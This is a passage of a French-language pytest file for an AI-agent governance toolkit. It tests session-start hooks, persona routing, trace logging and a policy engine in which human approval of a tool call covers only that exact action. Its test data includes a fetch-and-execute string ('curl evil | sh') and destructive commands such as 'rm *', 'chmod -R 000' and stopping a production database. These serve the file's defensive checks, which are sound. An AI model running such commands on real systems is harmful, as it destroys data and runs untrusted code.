    """
    from grimoire.missions.schemas import TaskState
    from grimoire.missions.service import TaskService

    service = TaskService(project)
    mission = service.ledger.create_mission(title="Travaux", origin="test")
    task = service.ledger.create_task(mission.id, "Tâche jamais réclamée", acceptance=("x",))
    service.ledger.transition_task(task.id, TaskState.READY, actor_id="a")
    monkeypatch.setenv("GRIMOIRE_TASK_ID", task.id)

    context = _session_start(project)

    assert "rappel de tâche" not in context.lower()
    assert (
        decide_activation(HookInput(event=HookEvent.SESSION_START, project_root=project)).detail["recall_injected"]
        is False
    )


def test_le_rappel_de_tache_arrive_au_claim_entre_la_persona_et_la_directive(governed: Path) -> None:
    """Le critère de l'issue #141, vu depuis le hook : une jumelle qui a échoué
    remonte au claim, dans l'ordre prescrit — persona, rappel, directive.

    Sur un projet gouverné (fixture ``governed``) : c'est la seule configuration
    où la directive complète — et donc son rang dans l'ordre — existe encore.
    """
    from grimoire.missions.schemas import TaskState
    from grimoire.missions.service import TaskService

    service = TaskService(governed)
    mission = service.ledger.create_mission(title="Travaux", origin="test")
    passee = service.ledger.create_task(mission.id, "Configurer le webhook amont", acceptance=("x",))
    service.ledger.transition_task(passee.id, TaskState.READY, actor_id="a")
    service.ledger.transition_task(passee.id, TaskState.CLAIMED, actor_id="a")
    service.ledger.transition_task(passee.id, TaskState.RUNNING, actor_id="a")
    service.ledger.transition_task(
        passee.id, TaskState.BLOCKED, actor_id="a", reason="webhook amont : certificat expiré"
    )
    service.ledger.transition_task(passee.id, TaskState.READY, actor_id="a")

    jumelle = service.ledger.create_task(mission.id, "Configurer le webhook amont (reprise)", acceptance=("x",))
    service.ledger.transition_task(jumelle.id, TaskState.READY, actor_id="b")
    service.ledger.claim_task(jumelle.id, "b", "host-b")

    context = _session_start(governed)

    assert "certificat expiré" in context
    assert (
        context.index("[Grimoire — persona d'entrée]")
        < context.index("[Grimoire — rappel de tâche]")
        < context.index("[Grimoire Standard]")
    )


def _configure_entry(root: Path, entry: str | None) -> None:
    """Écrit un project-context.yaml minimal ; ``None`` omet la clé."""
    lines = ["project:", '  name: "hosts-test"', '  type: "library"', "agents:", '  archetype: "minimal"']
    if entry is not None:
        lines.append(f'  entry: "{entry}"')
    (root / "project-context.yaml").write_text("\n".join(lines) + "\n", encoding="utf-8")


def test_the_entry_persona_defaults_to_concierge_without_a_config(project: Path) -> None:
    surface = build_surface(project)
    assert surface.entry_agent() is not None and surface.entry_agent().name == "concierge"


def test_the_project_designates_its_entry_persona(project: Path) -> None:
    """Un projet qui a son propre point d'entrée ne doit pas en recevoir un second."""
    _configure_entry(project, "scribe")
    names = {a.name: a.entry_point for a in collect_agents(project)}
    assert names == {"concierge": False, "scribe": True}
    context = _session_start(project)
    assert "**scribe**" in context and "**concierge**" not in context


def test_an_empty_entry_means_no_entry_persona(project: Path) -> None:
    """Vide n'est pas absent : c'est la déclaration « je porte déjà mon point d'entrée ».

    Sur un projet gouverné (board minimal) : sinon l'absence de persona et
    l'absence de standard adopté se confondraient dans le contexte produit.
    """
    _write_minimal_task_board(project)
    _configure_entry(project, "")
    assert build_surface(project).entry_agent() is None
    assert entry_persona_context(project) == ("", "")
    assert _session_start(project) == activation_context_text(project, task_id="bootstrap")


def test_an_entry_that_names_no_agent_is_reported_not_invented(project: Path) -> None:
    _configure_entry(project, "fantome")
    assert build_surface(project).entry_agent() is None
    assert entry_persona_context(project) == ("", "")


def test_choosing_an_entry_persona_is_recorded_in_the_trace_ledger(project: Path) -> None:
    """Le fait que #365 demande : quel agent, quand — écrit là où le choix se fait."""
    from grimoire.core.standard_generation import TRACES_DIR
    from grimoire.traces.ledger import TraceLedger

    _session_start(project)
    counts = TraceLedger(project / TRACES_DIR).agent_dispatch_counts()
    assert set(counts) == {"concierge"}
    assert counts["concierge"]["count"] == 1
    assert counts["concierge"]["last_seen"]


def test_no_entry_persona_writes_nothing_to_the_trace_ledger(tmp_path: Path) -> None:
    """Symétrique du fait précédent : rien à observer, rien d'écrit."""
    from grimoire.core.standard_generation import TRACES_DIR
    from grimoire.traces.ledger import TraceLedger

    _write_agent(tmp_path, "scribe", "Tu rédiges la documentation.")
    assert entry_persona_context(tmp_path) == ("", "")
    _session_start(tmp_path)
    assert TraceLedger(tmp_path / TRACES_DIR).agent_dispatch_counts() == {}


def test_an_unwritable_trace_ledger_never_breaks_session_start(project: Path) -> None:
    """Best-effort : un journal illisible n'est pas au prix de l'activation elle-même."""
    from grimoire.core.standard_generation import TRACES_DIR

    traces_dir = project / TRACES_DIR
    traces_dir.parent.mkdir(parents=True, exist_ok=True)
    # Un fichier régulier à l'emplacement du dossier attendu fait échouer le
    # `mkdir` du TraceLedger — exactement le type de panne qu'un journal
    # absent ou illisible peut produire en pratique.
    traces_dir.write_text("pas un dossier", encoding="utf-8")
    context = _session_start(project)
    assert "**concierge**" in context


def test_recording_an_agent_miss_is_captured_in_the_trace_ledger(project: Path) -> None:
    """Symétrique du choix (#366) : le concierge n'a trouvé aucun spécialiste (#389)."""
    from grimoire.core.standard_generation import TRACES_DIR
    from grimoire.hosts.decisions import record_agent_miss
    from grimoire.traces.ledger import TraceLedger

    record_agent_miss(
        project,
        category="tests",
        specialty="expert-playwright",
        fallback_agent="generic-dev",
        reason="aucun agent e2e déclaré",
    )
    misses = TraceLedger(project / TRACES_DIR).agent_miss_counts()
    assert set(misses) == {"expert-playwright"}
    assert misses["expert-playwright"]["count"] == 1
    assert misses["expert-playwright"]["last_seen"]


def test_repeated_misses_on_the_same_specialty_accumulate(project: Path) -> None:
    """Le critère d'arrêt de #389 : quelle spécialité a manqué, et combien de fois."""
    from grimoire.core.standard_generation import TRACES_DIR
    from grimoire.hosts.decisions import record_agent_miss
    from grimoire.traces.ledger import TraceLedger

    for _ in range(3):
        record_agent_miss(project, category="infra", specialty="terraform")
    misses = TraceLedger(project / TRACES_DIR).agent_miss_counts()
    assert misses["terraform"]["count"] == 3


def test_a_miss_without_a_nameable_specialty_is_still_counted(project: Path) -> None:
    """Un non-choix reste un signal même quand la spécialité n'a pas pu être nommée."""
    from grimoire.core.standard_generation import TRACES_DIR
    from grimoire.hosts.decisions import record_agent_miss
    from grimoire.traces.ledger import TraceLedger

    record_agent_miss(project, category="design")
    misses = TraceLedger(project / TRACES_DIR).agent_miss_counts()
    assert misses["(non nommée)"]["count"] == 1


def test_recording_an_agent_miss_never_stores_request_content(project: Path) -> None:
    """Refus explicite de l'issue #389 : jamais le contenu de la demande, seulement ce qui la classe."""
    from grimoire.core.standard_generation import TRACES_DIR
    from grimoire.hosts.decisions import record_agent_miss
    from grimoire.traces.ledger import TraceLedger

    record_agent_miss(
        project,
        category="tests",
        specialty="expert-playwright",
        fallback_agent="generic-dev",
        reason="aucun agent e2e déclaré",
    )
    trace = TraceLedger(project / TRACES_DIR)._load_all()[-1]
    # Les seuls champs porteurs de texte sont ceux passés explicitement par
    # l'appelant (category/specialty/reason comme étiquettes, jamais un
    # extrait de la demande) ; tout le reste de l'enregistrement est vide.
    assert set(trace.tags) == {
        "agent.miss",
        "category:tests",
        "specialty:expert-playwright",
        "reason:aucun agent e2e déclaré",
    }
    assert trace.agent_id == "generic-dev"
    assert trace.workflow_instance_id == ""
    assert trace.mission_id == ""
    assert trace.task_id == ""
    assert trace.host_id == ""
    assert trace.model == ""
    assert trace.tool_calls == ()
    assert trace.policy_verdicts == ()
    assert trace.evidence_refs == ()


def test_recording_a_miss_reports_that_it_wrote(project: Path) -> None:
    """Cas nominal : l'appelant doit pouvoir distinguer une écriture réelle d'un échec avalé."""
    from grimoire.hosts.decisions import record_agent_miss

    assert record_agent_miss(project, category="tests") is True


def test_an_unwritable_trace_ledger_never_breaks_recording_a_miss(project: Path) -> None:
    """Best-effort : un journal illisible n'est jamais au prix de la résolution qu'il observe,

    mais l'appelant doit le savoir — sinon la commande annoncerait une
    écriture qui n'a pas eu lieu (faux vert).
    """
    from grimoire.core.standard_generation import TRACES_DIR
    from grimoire.hosts.decisions import record_agent_miss

    traces_dir = project / TRACES_DIR
    traces_dir.parent.mkdir(parents=True, exist_ok=True)
    # Même panne que le test symétrique côté choix : un fichier régulier là où
    # le TraceLedger attend un dossier fait échouer son `mkdir`.
    traces_dir.write_text("pas un dossier", encoding="utf-8")
    written = record_agent_miss(project, category="tests")  # ne doit jamais lever
    assert written is False


def test_no_host_can_open_a_session_inside_an_agent(project: Path) -> None:
    """Le manque est déclaré, pas commenté — et chaque hôte nomme son substitut."""
    del project
    for host_id in supported_hosts():
        profile = profile_for(host_id)
        assert not profile.agent_autostart, f"{host_id.value} prétend démarrer dans un agent"
        gap = next((g for g in gaps_for(profile) if g.surface == "agent_autostart"), None)
        assert gap is not None, f"{host_id.value} tait le manque au lieu de le dégrader"
        if profile.supports_event(HookEvent.SESSION_START):
            assert "session_start" in gap.fallback
        else:
            assert profile.instructions_entrypoint in gap.fallback


def _write_agent_in(root: Path, tier_dir: str, name: str) -> None:
    """Un agent au faisceau volontairement banal, dans la couche demandée."""
    d = root / tier_dir
    d.mkdir(parents=True, exist_ok=True)
    (d / f"{name}.md").write_text(
        "\n".join(
            [
                "---",
                f'name: "{name}"',
                f'description: "{name} — rôle de test"',
                'tools: "read, edit"',
                "---",
                "Tu lis et tu édites.",
                "",
            ]
        ),
        encoding="utf-8",
    )


def test_deux_agents_du_kit_au_meme_faisceau_donnent_une_note_pas_une_erreur(tmp_path: Path) -> None:
    """Dette du kit (Grimoire-kit#375) : visible, jamais bloquante pour le projet."""
    from grimoire.hosts.collect import build_surface

    _write_agent_in(tmp_path, "_grimoire/kit/agents", "kit-a")
    _write_agent_in(tmp_path, "_grimoire/kit/agents", "kit-b")

    surface = build_surface(tmp_path)

    assert surface.notes, "la collision doit rester visible"
    assert "kit-a == kit-b" in surface.notes[0]
    assert "#375" in surface.notes[0]


def test_un_agent_override_au_meme_faisceau_qu_un_autre_est_refuse(tmp_path: Path) -> None:
    """Un agent créé dans le projet doit se distinguer : c'est le socle du système émergent."""
    from grimoire.core.exceptions import GrimoireAgentError
    from grimoire.hosts.collect import build_surface

    _write_agent_in(tmp_path, "_grimoire/kit/agents", "kit-a")
    _write_agent_in(tmp_path, "_grimoire/overrides/agents", "mon-agent")

    with pytest.raises(GrimoireAgentError, match="faisceau identique"):
        build_surface(tmp_path)


def test_deux_agents_distincts_ne_laissent_aucune_note(tmp_path: Path) -> None:
    from grimoire.hosts.collect import build_surface

    _write_agent_in(tmp_path, "_grimoire/kit/agents", "kit-a")
    d = tmp_path / "_grimoire/kit/agents"
    (d / "kit-c.md").write_text(
        '---\nname: "kit-c"\ndescription: "autre"\ntools: "read"\n---\nTu lis seulement.\n',
        encoding="utf-8",
    )

    assert build_surface(tmp_path).notes == ()


# ── SessionStart scaffolde la tâche active (issue #582 lot G1) ──────────────


def _claimed_task(root: Path) -> str:
    from grimoire.missions.schemas import TaskState
    from grimoire.missions.service import TaskService

    service = TaskService(root)
    mission = service.ledger.create_mission(title="Travaux", origin="test")
    task = service.ledger.create_task(mission.id, "Câbler le webhook", acceptance=("le webhook répond 200",))
    service.ledger.transition_task(task.id, TaskState.READY, actor_id="a")
    service.ledger.claim_task(task.id, "a", "local")
    service.project_board()
    return task.id


def test_session_start_scaffolds_the_claimed_task_of_a_governed_project(governed: Path) -> None:
    """Les artefacts que `gate check` réclamera existent avant la première commande de l'agent."""
    task_id = _claimed_task(governed)

    decision = decide_activation(HookInput(event=HookEvent.SESSION_START, project_root=governed))

    assert decision.detail["task_id"] == task_id
    assert decision.detail["scaffolded"] == [
        f"_grimoire-output/evidence/{task_id}/task-envelope.md",
        f"_grimoire-output/evidence/{task_id}/evidence-pack.md",
        f"_grimoire-output/evidence/{task_id}/claim-ledger.md",
        f"_grimoire-output/evidence/{task_id}/acceptance-record.md",
        f"_grimoire-output/context/{task_id}/context-bundle.yaml",
        f"_grimoire-output/decisions/{task_id}/decision-trace.yaml",
    ]
    assert "scaffold" not in decision.context.lower().replace("task scaffold", ""), "silencieux : rien dans le contexte"
    again = decide_activation(HookInput(event=HookEvent.SESSION_START, project_root=governed))
    assert again.detail["scaffolded"] == [], "idempotent : la deuxième session ne crée rien"


def test_session_start_scaffolds_nothing_on_an_unenrolled_project(project: Path) -> None:
    decision = decide_activation(HookInput(event=HookEvent.SESSION_START, project_root=project))

    assert decision.detail["governed"] is False
    assert "scaffolded" not in decision.detail
    assert not (project / "_grimoire-output/evidence").exists()


def test_session_start_scaffold_noop_stays_under_budget(governed: Path) -> None:
    """Quand tout existe (chaque session après la première), le scaffold coûte six `stat`.

    Seuil large (100 ms) contre une mesure de l'ordre de la milliseconde : il
    borne une régression de nature (rouvrir le ledger, re-parser le profil),
    pas un jitter de machine. Le chiffre mesuré est rapporté dans la PR.
    """
    import statistics
    import time

    from grimoire.hosts.decisions.activation import _scaffold_active_task

    task_id = _claimed_task(governed)
    assert _scaffold_active_task(governed, task_id)["scaffolded"]

    samples = []
    for _ in range(20):
        started = time.perf_counter()
        detail = _scaffold_active_task(governed, task_id)
        samples.append(time.perf_counter() - started)
        assert detail == {"scaffolded": []}
    assert statistics.median(samples) < 0.1, f"médiane {statistics.median(samples) * 1000:.1f} ms"


# ── Ancrage des affirmations (#613) ──────────────────────────────────────────


def test_copilot_agent_files_bind_every_claim_to_a_source(governed: Path) -> None:
    """Chaque fichier d'agent Copilot porte la règle de source et le bloc d'incertitudes.

    Avant : le wrapper disait « signale comme non vérifié ce que tu n'as pas
    vérifié » et le bloc ```grimoire-uncertainties``` ne vivait que dans
    `.github/hooks/README.md`, qu'aucun agent ne charge. Un utilisateur
    Copilot a vu ses personas produire des chiffres et des pronostics sur des
    fichiers jamais lus : rien dans leur contexte ne l'interdisait.
    """
    emitter = emitter_for(HostId.GITHUB_COPILOT)
    assert emitter is not None
    apply_plan(emitter.plan(build_surface(governed), governed), governed)

    entry = (governed / ".github/agents/concierge.agent.md").read_text(encoding="utf-8")
    sub = (governed / ".github/agents/scribe.agent.md").read_text(encoding="utf-8")

    for wrapper in (entry, sub):
        assert "fichier:ligne" in wrapper
        assert "non vérifié" in wrapper
        assert "grimoire-uncertainties" in wrapper
    # L'entrée route : elle exige le bloc des personas qu'elle dispatche,
    # sans jamais inventer un nom de modèle (dégradation « model affinity »).
    assert "Politique de dispatch" in entry
    assert "Politique de dispatch" not in sub
    for invented_model in ("haiku", "sonnet", "opus", "gpt-", "gemini"):
        assert invented_model not in entry.lower()


def test_claude_agent_files_bind_every_claim_to_a_source(project: Path) -> None:
    emitter = emitter_for(HostId.CLAUDE_CODE_CLI)
    assert emitter is not None
    apply_plan(emitter.plan(build_surface(project), project), project)
    sub = (project / ".claude/agents/scribe.md").read_text(encoding="utf-8")
    assert "fichier:ligne" in sub
    assert "non vérifié" in sub
    assert "grimoire-uncertainties" in sub


@pytest.mark.parametrize("host_id", supported_hosts(), ids=lambda h: h.value)
def test_every_host_emits_the_grounding_rule_and_the_uncertainties_block(governed: Path, host_id: HostId) -> None:
    """Aucun hôte n'est laissé sans règle de source (#613).

    Codex, Cursor et Gemini reçoivent un catalogue au lieu d'agents ; le
    balayage a montré qu'il ne portait ni « fichier:ligne », ni « non
    vérifié », ni le bloc d'incertitudes. La règle vient d'une seule source,
    `grimoire.core.grounding`, et chaque hôte doit l'émettre quelque part
    dans ce que l'agent charge.
    """
    from grimoire.core.grounding import GROUNDING_RULE

    emitter = emitter_for(host_id)
    assert emitter is not None
    plan = emitter.plan(build_surface(governed), governed)
    emitted = "\n".join(f.content for f in plan.files)
    assert GROUNDING_RULE in emitted, host_id
    assert "grimoire-uncertainties" in emitted, host_id
    assert "non mesuré" in emitted, host_id  # un score n'existe que calculé


# ── Délégation Copilot (#622) ────────────────────────────────────────────────


def test_copilot_entry_agent_can_delegate_to_every_routed_persona(governed: Path) -> None:
    """Sur VS Code, un agent ne délègue que s'il a l'outil `agent` et une liste `agents:` (#622).

    Des utilisateurs Copilot ont vu un concierge « sans droits » qui ne passait
    pas la main : déclaré `read, search`, il ne pouvait ni agir ni invoquer une
    autre persona, et le wrapper lui disait « tranche toi-même ». Le point
    d'entrée reçoit désormais l'outil `agent`, la liste des personas routées
    ; une persona routée ne reçoit rien de tout ça.
    """
    emitter = emitter_for(HostId.GITHUB_COPILOT)
    assert emitter is not None
    apply_plan(emitter.plan(build_surface(governed), governed), governed)

    entry = (governed / ".github/agents/concierge.agent.md").read_text(encoding="utf-8")
    sub = (governed / ".github/agents/scribe.agent.md").read_text(encoding="utf-8")

    tools_line = next(line for line in entry.splitlines() if line.startswith("tools:"))
    assert "'agent'" in tools_line, tools_line
    assert "agents: [" in entry and "'scribe'" in entry.split("agents: [", 1)[1].split("]", 1)[0]
    # Le corps dit comment déléguer, et interdit le « je n'ai pas les droits ».
    assert "outil `agent`" in entry
    assert "tranche toi-même" not in entry
    assert "plus la délégation" in entry
    # Une persona routée reste invocable comme sous-agent, sans être elle-même un routeur.
    assert "agents:" not in sub
    assert "plus la délégation" not in sub
    assert "tools: ['read', 'search', 'edit']" in sub


# ── Le point d'entrée Copilot agit ET délègue (#622, second retour) ─────────


def test_copilot_entry_agent_acts_with_the_union_of_routed_tools(governed: Path) -> None:
    """Second retour utilisateur : « de gros soucis de droits, capable de rien ».

    Un concierge en `read, search` qui ne fait que router dépend d'un VS Code
    qui sait lancer des sous-agents et d'un modèle qui appelle l'outil. Décision
    de Guilhem (2026-09-25) : sur Copilot, le point d'entrée reçoit l'union des
    outils des personas qu'il route, plus `agent` — sur une demande directe et
    bornée il agit lui-même, sinon il délègue (GAO-d-le-concier-001). Le modèle
    de son orchestrateur écrit à la main dans la Forge.
    """
    emitter = emitter_for(HostId.GITHUB_COPILOT)
    assert emitter is not None
    apply_plan(emitter.plan(build_surface(governed), governed), governed)
    entry = (governed / ".github/agents/concierge.agent.md").read_text(encoding="utf-8")
    sub = (governed / ".github/agents/scribe.agent.md").read_text(encoding="utf-8")

    tools_line = next(line for line in entry.splitlines() if line.startswith("tools:"))
    for tool in ("'read'", "'search'", "'edit'", "'execute'", "'agent'"):
        assert tool in tools_line, tools_line
    assert "tu fais le travail toi-même" in entry
    assert "tu ne fais pas le travail toi-même" not in entry
    # La persona routée garde sa frontière propre : rien d'hérité de l'entrée.
    assert "tools: ['read', 'search', 'edit']" in sub


def test_copilot_entry_agent_gates_self_execution_on_a_direct_bounded_request(governed: Path) -> None:
    """GAO-d-le-concier-001 : l'auto-exécution n'est plus un repli sans condition.

    Mesure sur 98 sessions Claude Code : le concierge ne délègue presque
    jamais (3/98), faute d'un gate — « aucun spécialiste ne convient »
    couvrait en pratique toute demande un peu ouverte. Le gate devient
    « demande directe et bornée », au sens de la compétence attachée
    `grimoire-agent-dispatch` (citée, pas dupliquée dans le wrapper).
    """
    emitter = emitter_for(HostId.GITHUB_COPILOT)
    assert emitter is not None
    apply_plan(emitter.plan(build_surface(governed), governed), governed)
    entry = (governed / ".github/agents/concierge.agent.md").read_text(encoding="utf-8")

    assert "directe et bornée" in entry
    assert "grimoire-agent-dispatch" in entry
    # L'ancien repli sans condition (« quand un rôle précis existe, sinon tu
    # fais le travail toi-même ») a disparu.
    assert "quand la demande relève d'un rôle précis" not in entry
    # Le palier de vérifiabilité qui guide la délégation reste cité (#329).
    assert "V0" in entry and "V1" in entry and "V2" in entry


def test_copilot_maps_the_web_verb_to_the_vs_code_web_tool_set(project: Path) -> None:
    """`fetch` n'est pas un nom d'outil VS Code : le tool set s'appelle `web` (docs « tools reference »).

    Un nom inconnu est ignoré en silence, donc une persona déclarant `web`
    perdait l'accès au web sans qu'aucun message ne le dise.
    """
    _write_agent(project, "veilleur", "Tu consultes des sources en ligne.", tools="'read', 'web'")
    emitter = emitter_for(HostId.GITHUB_COPILOT)
    assert emitter is not None
    apply_plan(emitter.plan(build_surface(project), project), project)
    wrapper = (project / ".github/agents/veilleur.agent.md").read_text(encoding="utf-8")
    tools_line = next(line for line in wrapper.splitlines() if line.startswith("tools:"))
    assert "'web'" in tools_line, tools_line
    assert "fetch" not in tools_line, tools_line


# ── W1-09 : l'approbation d'une règle `require_approval` suit l'action exécutée ──

_APPROVAL_POLICIES = """rules:
  - id: {rid}
    description: d
    action_kinds: []
    mutation_classes: []
    risk_profiles: []
    verdict_on_match: warn
    reason_template: r
    tool_pattern: "{pattern}"
    require_approval: true
"""


def _approval_project(tmp_path: Path, rid: str, pattern: str) -> Path:
    standard = tmp_path / "_grimoire" / "standard"
    standard.mkdir(parents=True)
    (standard / "policies.yaml").write_text(_APPROVAL_POLICIES.format(rid=rid, pattern=pattern), encoding="utf-8")
    return tmp_path


def _pre(root: Path, tool: str, tool_input: dict[str, object], tool_use_id: str = "") -> Outcome:
    return decide_tool_policy(
        HookInput(
            event=HookEvent.PRE_TOOL_USE,
            project_root=root,
            tool_name=tool,
            tool_input=tool_input,
            session_id="s1",
            tool_use_id=tool_use_id,
        )
    ).outcome


def _post(root: Path, tool: str, tool_input: dict[str, object], tool_use_id: str = "") -> None:
    decide_evidence_trace(
        HookInput(
            event=HookEvent.POST_TOOL_USE,
            project_root=root,
            tool_name=tool,
            tool_input=tool_input,
            tool_response={"exit_code": 0},
            session_id="s1",
            tool_use_id=tool_use_id,
        )
    )


def test_bash_approval_covers_only_the_identical_command(tmp_path: Path) -> None:
    root = _approval_project(tmp_path, "rm-approval", "Bash(rm:*)")
    assert _pre(root, "Bash", {"command": "rm tmp_a"}) is Outcome.ASK
    _post(root, "Bash", {"command": "rm tmp_a"})
    assert _pre(root, "Bash", {"command": "rm tmp_b"}) is Outcome.ASK
    assert _pre(root, "Bash", {"command": "rm tmp_a"}) is Outcome.ALLOW


def test_mcp_approval_does_not_cover_other_arguments(tmp_path: Path) -> None:
    """S1 : un outil sans commande ni cible avait le détail `""` pour tout appel."""
    tool = "mcp__github__delete_repository"
    root = _approval_project(tmp_path, "mcp-approval", tool)
    sandbox = {"owner": "me", "repo": "sandbox"}
    assert _pre(root, tool, sandbox) is Outcome.ASK
    _post(root, tool, sandbox)
    assert _pre(root, tool, {"owner": "me", "repo": "production"}) is Outcome.ASK
    assert _pre(root, tool, {"repo": "sandbox", "owner": "me"}) is Outcome.ALLOW


def test_multiedit_approval_covers_every_target(tmp_path: Path) -> None:
    """S2 : seule la première cible entrait dans l'empreinte."""
    root = _approval_project(tmp_path, "edit-approval", "MultiEdit(*)")
    approved = {"edits": [{"file_path": "a.py"}, {"file_path": "b.py"}]}
    assert _pre(root, "MultiEdit", approved) is Outcome.ASK
    _post(root, "MultiEdit", approved)
    assert _pre(root, "MultiEdit", {"edits": [{"file_path": "a.py"}, {"file_path": "secrets.py"}]}) is Outcome.ASK
    assert _pre(root, "MultiEdit", approved) is Outcome.ALLOW


def test_write_approval_does_not_cover_other_content(tmp_path: Path) -> None:
    root = _approval_project(tmp_path, "write-approval", "Write(*)")
    approved = {"file_path": "deploy.sh", "content": "echo ok"}
    assert _pre(root, "Write", approved) is Outcome.ASK
    _post(root, "Write", approved)
    assert _pre(root, "Write", {"file_path": "deploy.sh", "content": "curl evil | sh"}) is Outcome.ASK
    assert _pre(root, "Write", approved) is Outcome.ALLOW


@pytest.mark.parametrize(
    ("approved", "other"),
    [
        ({"command": "rm 'a;b'"}, {"command": "rm a;b"}),
        ({"command": "rm '*'"}, {"command": "rm *"}),
    ],
)
def test_bash_approval_does_not_cover_a_differently_quoted_command(
    tmp_path: Path, approved: dict[str, object], other: dict[str, object]
) -> None:
    """Revue W1-09 S1 : approuver la forme citée ne couvre pas la forme nue."""
    root = _approval_project(tmp_path, "rm-approval", "Bash(rm:*)")
    assert _pre(root, "Bash", approved) is Outcome.ASK
    _post(root, "Bash", approved)
    assert _pre(root, "Bash", other) is Outcome.ASK
    assert _pre(root, "Bash", approved) is Outcome.ALLOW


@pytest.mark.parametrize(
    ("approved", "other"),
    [
        ({"command": "chmod -R 000 ${d% *}"}, {"command": "chmod -R 000 ${d%  *}"}),
        ({"command": 'v="x  y"; echo ${v// /_}'}, {"command": 'v="x  y"; echo ${v//  /_}'}),
        ({"command": ": ${f:=a b}"}, {"command": ": ${f:=a  b}"}),
    ],
)
def test_bash_approval_does_not_cover_a_parameter_expansion_read_differently(
    tmp_path: Path, approved: dict[str, object], other: dict[str, object]
) -> None:
    """Revue W1-09 tour 3 S1 : Pre/Post/Pre, `${d% *}` et `${d%  *}` ne développent pas pareil."""
    root = _approval_project(tmp_path, "any-approval", "Bash")
    assert _pre(root, "Bash", approved) is Outcome.ASK
    _post(root, "Bash", approved)
    assert _pre(root, "Bash", other) is Outcome.ASK
    assert _pre(root, "Bash", approved) is Outcome.ALLOW


@pytest.mark.parametrize(
    ("approved", "other"),
    [
        ({"command": "rm \u201ca  b\u201d"}, {"command": "rm \u201ca b\u201d"}),
        ({"command": "rm \u201ea  b\u201c"}, {"command": "rm \u201ea b\u201c"}),
        ({"command": "rm \u2018a  b\u2019"}, {"command": "rm \u2018a b\u2019"}),
        ({"command": "declare -A m; m[k  1]=x"}, {"command": "declare -A m; m[k 1]=x"}),
    ],
)
def test_bash_approval_does_not_cover_typographic_quotes_or_array_subscripts(
    tmp_path: Path, approved: dict[str, object], other: dict[str, object]
) -> None:
    """Revue W1-09 tour 4 S1 : PowerShell cite avec \u201c\u201d, bash indexe `m[a  b]` et `m[a b]` à part."""
    root = _approval_project(tmp_path, "any-approval", "Bash")
    assert _pre(root, "Bash", approved) is Outcome.ASK
    _post(root, "Bash", approved)
    assert _pre(root, "Bash", other) is Outcome.ASK
    assert _pre(root, "Bash", approved) is Outcome.ALLOW


def test_run_in_terminal_approval_does_not_cover_typographic_quotes(tmp_path: Path) -> None:
    root = _approval_project(tmp_path, "term-approval", "run_in_terminal")
    approved = {"command": "./build \u201cold  x\u201d"}
    assert _pre(root, "run_in_terminal", approved) is Outcome.ASK
    _post(root, "run_in_terminal", approved)
    assert _pre(root, "run_in_terminal", {"command": "./build \u201cold x\u201d"}) is Outcome.ASK


def test_approval_survives_a_rewritten_input_between_pre_and_post(tmp_path: Path) -> None:
    """Revue W1-09 tour 4 S2 : le hook RTK réécrit `git status` en `rtk git status`, et le
    PostToolUse reçoit l'entrée réécrite ; l'empreinte du Pre est reprise par `tool_use_id`."""
    root = _approval_project(tmp_path, "git-approval", "Bash(git:*)")
    assert _pre(root, "Bash", {"command": "git status"}, "toolu_1") is Outcome.ASK
    _post(root, "Bash", {"command": "rtk git status"}, "toolu_1")
    assert _pre(root, "Bash", {"command": "git status"}, "toolu_2") is Outcome.ALLOW
    assert _pre(root, "Bash", {"command": "git push origin main"}, "toolu_3") is Outcome.ASK


def test_a_rewritten_input_does_not_approve_the_rewritten_command(tmp_path: Path) -> None:
    """L'approbation suit l'action demandée au Pre, pas celle que le Post a vue."""
    root = _approval_project(tmp_path, "git-approval", "Bash(git:*)")
    assert _pre(root, "Bash", {"command": "git status"}, "toolu_1") is Outcome.ASK
    _post(root, "Bash", {"command": "git push origin main"}, "toolu_1")
    assert _pre(root, "Bash", {"command": "git push origin main"}, "toolu_2") is Outcome.ASK
    assert _pre(root, "Bash", {"command": "git status"}, "toolu_3") is Outcome.ALLOW


def test_post_without_a_matching_tool_use_id_falls_back_to_its_own_input(tmp_path: Path) -> None:
    root = _approval_project(tmp_path, "git-approval", "Bash(git:*)")
    assert _pre(root, "Bash", {"command": "git status"}, "toolu_1") is Outcome.ASK
    _post(root, "Bash", {"command": "git status"}, "toolu_other")
    assert _pre(root, "Bash", {"command": "git status"}, "toolu_2") is Outcome.ALLOW


@pytest.mark.parametrize(
    ("tool", "approved", "other"),
    [
        (
            "mcp__ssh__exec",
            {"host": "staging", "command": "systemctl stop db"},
            {"host": "prod", "command": "systemctl stop db"},
        ),
        ("mcp__x__op", {"command": "delete", "path": "a"}, {"command": "delete", "path": "secrets"}),
        ("run_in_terminal", {"command": "rm a", "cwd": "/tmp/x"}, {"command": "rm a", "cwd": "/home"}),
    ],
)
def test_command_approval_covers_the_other_arguments_too(
    tmp_path: Path, tool: str, approved: dict[str, object], other: dict[str, object]
) -> None:
    """Revue W1-09 S2 : la commande seule ne dit ni l'hôte, ni la cible, ni le répertoire."""
    root = _approval_project(tmp_path, "any-approval", tool)
    assert _pre(root, tool, approved) is Outcome.ASK
    _post(root, tool, approved)
    assert _pre(root, tool, other) is Outcome.ASK
    assert _pre(root, tool, approved) is Outcome.ALLOW


def test_native_bash_approval_ignores_description_and_timeout_only(tmp_path: Path) -> None:
    root = _approval_project(tmp_path, "rm-approval", "Bash(rm:*)")
    first = {"command": "rm tmp_a", "description": "clean", "timeout": 1000}
    assert _pre(root, "Bash", first) is Outcome.ASK
    _post(root, "Bash", first)
    assert _pre(root, "Bash", {"command": "rm  tmp_a", "description": "autre", "timeout": 5}) is Outcome.ALLOW
    assert _pre(root, "Bash", {"command": "rm tmp_a", "run_in_background": True}) is Outcome.ASK


def test_copilot_terminal_approval_ignores_explanation_and_goal_only(tmp_path: Path) -> None:
    """Revue W1-09 tour 3 S3 : `explanation`/`goal` sont du texte d'affichage, pas l'action."""
    root = _approval_project(tmp_path, "term-approval", "run_in_terminal")
    first = {"command": "npm run deploy", "explanation": "Deploy the app", "goal": "ship", "isBackground": False}
    assert _pre(root, "run_in_terminal", first) is Outcome.ASK
    _post(root, "run_in_terminal", first)
    same = {"command": "npm  run deploy", "explanation": "Redeploy after fix", "goal": "x", "isBackground": False}
    assert _pre(root, "run_in_terminal", same) is Outcome.ALLOW
    assert _pre(root, "run_in_terminal", {**same, "isBackground": True}) is Outcome.ASK
    assert _pre(root, "run_in_terminal", {**same, "cwd": "/home"}) is Outcome.ASK
    assert _pre(root, "run_in_terminal", {**same, "command": "npm run drop"}) is Outcome.ASK


def test_a_lone_surrogate_keeps_a_destructive_command_denied(tmp_path: Path) -> None:
